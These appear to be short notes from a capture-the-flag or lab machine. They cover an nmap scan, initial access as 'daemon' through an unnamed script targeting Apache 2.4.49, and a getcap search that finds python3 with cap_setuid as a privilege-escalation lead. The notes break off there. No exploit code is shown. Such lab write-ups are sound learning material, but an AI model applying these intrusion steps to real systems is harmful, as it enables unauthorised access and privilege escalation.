Recon
```
sudo nmap -sV -Pn -p- -T 4 '10.10.134.28'
[sudo] password for gomez22: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-29 19:06 PDT
Nmap scan report for 10.10.134.28
Host is up (0.17s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.49 ((Unix))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 273.33 seconds
```


Enumeration
-> total bust

Initial Access
-> shell script for vulnerable apache version
```
└─$ ./*.sh target.txt /bin/sh whoami
10.10.134.28
daemon
```

Pivoting (maybe)
Privesc (privelege escalation)


```
daemon@4a70924bafa0:/tmp$ getcap -r / 2>/dev/null
/usr/bin/python3.7 = cap_setuid+ep
```

getcap -r / 2>/dev/null
